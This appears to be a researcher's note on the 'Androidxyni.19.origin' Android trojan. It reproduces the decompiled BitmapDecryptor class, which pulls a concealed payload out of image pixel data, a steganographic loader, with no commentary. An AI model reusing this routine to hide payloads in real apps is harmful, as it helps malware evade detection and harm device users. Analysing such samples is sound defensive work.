---
created: 2021-05-07T02:24:53-04:00
modified: 2021-05-07T02:26:38-04:00
---

# Androidxyni.19.origin Trojan

Code  Expand source 
package com.wch.c_direct.encrypt.logic;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import com.wch.c_direct.logic.a;
import java.io.InputStream;
import java.util.Arrays;
public final class BitmapDecryptor {
    public static byte[] decrypt(InputStream inputStream) {
        int i5;
        int i = 4;
        int i1 = 8;
        a.a();
        Bitmap bitmap0 = BitmapFactory.decodeStream(inputStream);
        bitmap0.setHasAlpha(true);
        byte[] buffer1 = new byte[i1];
        int i2 = 0;
        int i3 = 0;
        int i4 = 0;
        while(i2 < buffer1.length) {
            i5 = bitmap0.getPixel(i4, i3);
            buffer1[i2] = ((byte)(i5 >> 16 & 15));
            if(i2 + 1 < i1) {
                buffer1[i2 + 1] = ((byte)(i5 >> 8 & 15));
            }
            if(i2 + 2 < i1) {
                buffer1[i2 + 2] = ((byte)(i5 & 15));
            }
            ++i4;
            if(i4 == bitmap0.getWidth()) {
                ++i3;
                i4 = 0;
            }
            i2 += 3;
        }
        byte[] buffer2 = BitmapDecryptor.a(buffer1);
        i2 = 0;
        i3 = 0;
        while(i2 < i) {
            i3 = i3 << 8 | buffer2[i2] & 255;
            ++i2;
        }
        buffer1 = new byte[i3 * 8 / 4];
        i2 = 0;
        i3 = 0;
        i4 = 0;
        while(i2 < buffer1.length) {
            i5 = bitmap0.getPixel(i4, i3);
            buffer1[i2] = ((byte)(i5 >> 16 & 15));
            if(i2 + 1 < buffer1.length) {
                buffer1[i2 + 1] = ((byte)(i5 >> 8 & 15));
            }
            if(i2 + 2 < buffer1.length) {
                buffer1[i2 + 2] = ((byte)(i5 & 15));
            }
            ++i4;
            if(i4 == bitmap0.getWidth()) {
                ++i3;
                i4 = 0;
            }
            i2 += 3;
        }
        byte[] decrypted = BitmapDecryptor.a(buffer1);
        bitmap0.recycle();
        return Arrays.copyOfRange(decrypted, i, decrypted.length);
    }
    private static byte[] a(byte[] inBuffer) {
        a.a();
        byte[] outBuffer = new byte[inBuffer.length / 2];
        int i;
        for(i = 0; i < outBuffer.length; ++i) {
            int i1;
            for(i1 = 0; i1 < 2; ++i1) {
                outBuffer[i] = ((byte)(outBuffer[i] << 4 | inBuffer[i * 8 / 4 + i1]));
            }
        }
        return outBuffer;
    }
}